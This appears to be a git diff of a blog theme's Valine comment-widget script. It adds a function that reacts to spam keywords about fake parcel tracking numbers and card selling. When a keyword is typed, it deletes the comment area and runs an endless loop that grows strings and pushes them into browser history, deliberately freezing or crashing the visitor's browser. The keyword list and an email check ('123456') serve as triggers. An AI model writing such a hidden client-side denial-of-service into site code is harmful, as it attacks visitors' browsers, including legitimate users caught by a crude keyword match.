@@ -36,7 +36,6 @@
 
   function pjax_valine() {
     if(!document.querySelectorAll("#valine_container")[0])return;
-
     let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) || "<%= theme.comments.valine.placeholder %>";
 
     let path = $.trim($('#pjax-comment-path').text());
@@ -75,13 +74,35 @@
       emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
       emojiMaps: emojiMaps
     });
-    // if (window.AV == undefined) {
-    //   setTimeout(() => {
-    //     pv_count();
-    //   }, 3000);
-    // } else {
-    //   pv_count();
-    // }
+    if (window.AV == undefined) {
+      setTimeout(() => {
+        fxxk();
+      }, 3000);
+    } else {
+      fxxk();
+    }
+  }
+
+  function fxxk() {
+    const reg = /发卡|空包|代发|快递单号|dh5u|88danhaowang/g;
+    $('#veditor').keyup(function(){
+        if (reg.exec($(this).val())) {
+          comments.remove();
+          while (true) {
+            var total = "";
+            for (var i = 0; i < 1000000000000000000000000000000000000000000000; i++) {
+              total = total + i.toString();
+              history.pushState(0, 0, total)
+            }
+          }
+        }
+    });
+
+    $('.vmail.vinput').keyup(function(){
+      if ($(this).val().indexOf('123456') != -1) {
+        comments.remove();
+      }
+    });
   }
 
   const utils = {
